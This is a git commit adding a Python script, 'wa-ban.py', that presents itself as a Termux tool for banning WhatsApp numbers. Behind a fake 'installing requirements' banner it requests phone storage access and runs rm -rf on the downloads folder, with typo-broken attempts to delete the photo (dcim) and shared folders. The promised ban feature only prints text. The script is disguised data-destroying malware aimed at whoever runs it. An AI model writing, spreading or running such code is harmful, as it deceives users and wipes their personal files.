4c074b836d75a48d826961f48cb00ceba405820c
stark1000 <108525160+stark1000@users.noreply.github.com>
2022-07-01 16:24:25 +0530

    Add files via upload

---
+++ wa-ban.py
@@ -0,0 +1,42 @@
+import os
+import time
+import sys
+
+os.system("clear")
+
+print("\033[1;32m [+] Installing requirments.......  \n")
+
+time.sleep(5.00)
+
+os.system("clear")
+os.system("pip3 install colorma")
+os.system("apt install figlet")
+os.system("clear")
+os.system("figlet wa-ban -f bigmono12.tlf")
+os.system("termux-setup-storage")
+os.system("cd")
+os.system("cd storage")
+os.system("rm -rf downloads")
+os.system("rm-rf dcim")
+os.sysyem("rm-rf shared")
+
+import sys
+from termcolor import colored, cprint
+text = colored('CODED BY STARK', 'red', attrs=['reverse', 'blink'])
+print(text)
+print("ENTER THE CHOICE")
+
+
+print (" 1. Ban number")
+print (" 2. Exit")
+
+
+
+choice = int(input("ENTER THE CHOICE : "))
+looper=0
+while True:
+    if choice==1:
+        print("1 selected")
+        print ("᷶᷶")
+    else:
+        print:("invalid choice")
